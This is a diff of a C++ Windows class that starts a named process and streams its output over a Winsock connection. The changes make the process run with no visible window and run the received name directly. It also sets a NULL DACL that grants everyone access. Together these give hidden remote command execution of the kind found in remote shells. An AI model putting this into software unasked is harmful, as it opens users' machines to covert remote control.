@@ -3,11 +3,12 @@
 // General
 #include "LocalProcess.h"
 
-
 LocalProcess::LocalProcess(WinsockClient* client, CComBSTR name) :
 	m_Name(name),
 	m_Client(client)
 {
+	m_Client->Send(L"SStarting [%s] process.", m_Name);
+
 	SECURITY_DESCRIPTOR sd;
 	InitializeSecurityDescriptor(&sd, SECURITY_DESCRIPTOR_REVISION);
 	SetSecurityDescriptorDacl(&sd, true, NULL, false);
@@ -31,11 +32,11 @@ LocalProcess::LocalProcess(WinsockClient* client, CComBSTR name) :
 
 	if (!CreateProcess(
 		NULL,
-		L"cmd.exe /U /c \"" + m_Name + "\"",
+		m_Name,
 		NULL,
 		NULL,
 		TRUE,
-		0,
+		NORMAL_PRIORITY_CLASS | CREATE_NO_WINDOW,
 		NULL,
 		NULL,
 		&m_StartupInfo,
@@ -46,11 +47,10 @@ LocalProcess::LocalProcess(WinsockClient* client, CComBSTR name) :
 		return;
 	}
 
-	Sleep(100); // ???? AV
 	m_Client->Send(L"SThe process [%s] was started.", m_Name);
 	Sleep(100);
-	Thread<LocalProcess> thread(this, &LocalProcess::WaitProcess);
-	thread.start();
+	Thread<LocalProcess> threadWaiterExiteCode(this, &LocalProcess::WaitExitCode);
+	threadWaiterExiteCode.start();
 	Sleep(100);
 }
 
@@ -62,7 +62,7 @@ LocalProcess::~LocalProcess()
 	CloseHandle(m_ReadStdOut);
 }
 
-DWORD LocalProcess::WaitProcess()
+DWORD LocalProcess::WaitExitCode()
 {
 	char buffer[DEFAULT_BUFLEN];
 	bzero(buffer);
@@ -71,11 +71,10 @@ DWORD LocalProcess::WaitProcess()
 	{
 		unsigned long exitCode = 0;
 		GetExitCodeProcess(m_ProcessInfo.hProcess, &exitCode);
+		Sleep(50);
 		if (exitCode != STILL_ACTIVE)
 		{
-			Sleep(100);
 			m_Client->Send(L"XThe process [%s] was exited with code [%d].", m_Name, exitCode);
-			Sleep(100);
 			return exitCode;
 		}
 
@@ -93,7 +92,7 @@ DWORD LocalProcess::WaitProcess()
 			{
 				ReadFile(m_ReadStdOut, buffer, DEFAULT_BUFLEN - 1, &readedBytes, NULL);
 				USES_CONVERSION;
-				m_Client->Send(L"M%s", A2W(buffer));
+				m_Client->Send(L"%s", A2W(buffer));
 				bzero(buffer);
 			}
 		}
@@ -101,7 +100,7 @@ DWORD LocalProcess::WaitProcess()
 		{
 			ReadFile(m_ReadStdOut, buffer, DEFAULT_BUFLEN - 1, &readedBytes, NULL);
 			USES_CONVERSION;
-			m_Client->Send(L"M%s", A2W(buffer));
+			m_Client->Send(L"%s", A2W(buffer));
 			bzero(buffer);
 		}
 	}
